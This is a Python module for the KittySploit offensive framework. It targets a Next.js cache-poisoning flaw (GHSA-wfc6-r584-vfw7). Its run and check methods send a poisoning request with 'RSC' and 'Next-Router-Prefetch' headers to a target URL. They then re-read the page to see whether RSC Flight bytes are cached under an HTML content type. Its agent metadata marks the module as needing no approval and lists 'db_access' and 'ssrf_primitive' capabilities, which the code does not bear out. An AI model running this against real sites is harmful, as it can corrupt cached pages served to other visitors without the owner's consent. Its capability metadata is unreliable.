#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js RSC / HTML cache poisoning (GHSA-wfc6-r584-vfw7)",
        "description": (
            "Three GETs on the same URL: baseline, then with loose `RSC` + `Next-Router-Prefetch`, then "
            "clean again. Pre-16.2.5 stacks may mis-classify Flight as text/html so CDNs cache RSC bytes "
            "under an HTML content-type key."
        ),
        "author": ["KittySploit Team"],
        "references": ["https://github.com/advisories/GHSA-wfc6-r584-vfw7"],
        "tags": ["http", "nextjs", "rsc", "cache", "ghsa"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints', 'params'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    rsc_header_value = OptString(
        "text/x-component",
        "Value for the RSC request header (truthy non-1 value triggers loose accept path)",
        required=False,
        advanced=True,
    )

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _get(self, extra_headers=None):
        url = self._url()
        kw = dict(timeout=float(self._o(self.timeout)))
        if extra_headers:
            kw["headers"] = extra_headers
        try:
            r = self.get(url, **kw)
            ct = (r.headers.get("Content-Type") or "").lower()
            return r.status_code, ct, r.content[:2048], None
        except Exception as e:
            return -1, "", b"", str(e)
        finally:
            if extra_headers:
                for k in extra_headers:
                    self.session.headers.pop(k, None)

    @staticmethod
    def _rsc_framing(body: bytes) -> bool:
        if not body:
            return False
        return body.startswith(b"0:") or b"$react" in body or b'"$",' in body

    def _probe(self):
        c1, ct1, b1, e1 = self._get()
        rsc_val = str(self._o(self.rsc_header_value) or "text/x-component").strip() or "text/x-component"
        c2, ct2, b2, e2 = self._get({"RSC": rsc_val, "Next-Router-Prefetch": "1"})
        c3, ct3, b3, e3 = self._get()
        return {
            "baseline": {"code": c1, "content_type": ct1, "error": e1},
            "poison": {"code": c2, "content_type": ct2, "error": e2},
            "reread": {"code": c3, "content_type": ct3, "error": e3},
            "_b2": b2,
            "_b3": b3,
        }

    def _vulnerable(self, ctx) -> bool:
        ct2 = ctx["poison"]["content_type"] or ""
        ct3 = ctx["reread"]["content_type"] or ""
        b2 = ctx.pop("_b2", b"")
        b3 = ctx.pop("_b3", b"")
        if "text/html" in ct3 and self._rsc_framing(b3):
            return True
        if "text/html" in ct2 and self._rsc_framing(b2):
            return True
        return False

    def check(self):
        ctx = self._probe()
        e1 = ctx["baseline"].get("error")
        if e1:
            return {"vulnerable": False, "reason": f"Baseline GET failed: {e1}", "confidence": "high"}
        if ctx["poison"].get("error"):
            return {
                "vulnerable": False,
                "reason": f"Poison GET failed: {ctx['poison']['error']}",
                "confidence": "high",
                "detail": {k: v for k, v in ctx.items() if not k.startswith("_")},
            }
        if ctx["reread"].get("error"):
            return {
                "vulnerable": False,
                "reason": f"Re-read GET failed: {ctx['reread']['error']}",
                "confidence": "high",
                "detail": {k: v for k, v in ctx.items() if not k.startswith("_")},
            }
        vuln = self._vulnerable(dict(ctx))
        pub = {
            "baseline": ctx["baseline"],
            "poison": ctx["poison"],
            "reread": ctx["reread"],
            "poison_framing": self._rsc_framing(ctx.get("_b2", b"")),
            "reread_framing": self._rsc_framing(ctx.get("_b3", b"")),
        }
        if vuln:
            return {
                "vulnerable": True,
                "reason": "text/html + RSC Flight markers (mis-cache / poison signal)",
                "confidence": "medium",
                "detail": pub,
            }
        return {
            "vulnerable": False,
            "reason": "No RSC-as-HTML signal on poison or re-read",
            "confidence": "medium",
            "detail": pub,
        }

    def run(self) -> bool:
        print_info(f"Target: {self._url()}")
        c1, ct1, b1, e1 = self._get()
        print_status("[1/3] Baseline (no RSC header)")
        if e1:
            print_error(f"Baseline failed: {e1}")
            return False
        print_status(f"  HTTP {c1}  Content-Type: {ct1 or '(none)'}")
        print_status(f"  body[:80]: {b1[:80]!r}")

        rsc_val = str(self._o(self.rsc_header_value) or "text/x-component").strip() or "text/x-component"
        c2, ct2, b2, e2 = self._get({"RSC": rsc_val, "Next-Router-Prefetch": "1"})
        print_status("[2/3] Poisoning request (RSC + Next-Router-Prefetch)")
        if e2:
            print_error(f"Poison GET failed: {e2}")
            return False
        print_status(f"  HTTP {c2}  Content-Type: {ct2 or '(none)'}")
        print_status(f"  body[:80]: {b2[:80]!r}")

        c3, ct3, b3, e3 = self._get()
        print_status("[3/3] Re-read (clean client)")
        if e3:
            print_error(f"Re-read failed: {e3}")
            return False
        print_status(f"  HTTP {c3}  Content-Type: {ct3 or '(none)'}")
        print_status(f"  body[:80]: {b3[:80]!r}")

        hit3 = "text/html" in (ct3 or "") and self._rsc_framing(b3)
        hit2 = "text/html" in (ct2 or "") and self._rsc_framing(b2)
        if hit3:
            print_error("Vulnerable: re-read is text/html but body looks like RSC Flight (cache poisoned).")
            return True
        if hit2:
            print_error("Vulnerable: poison response was text/html with RSC framing (CDN-keyed mis-cache).")
            return True
        print_success("Likely patched or no mis-classification on this URL.")
        return False
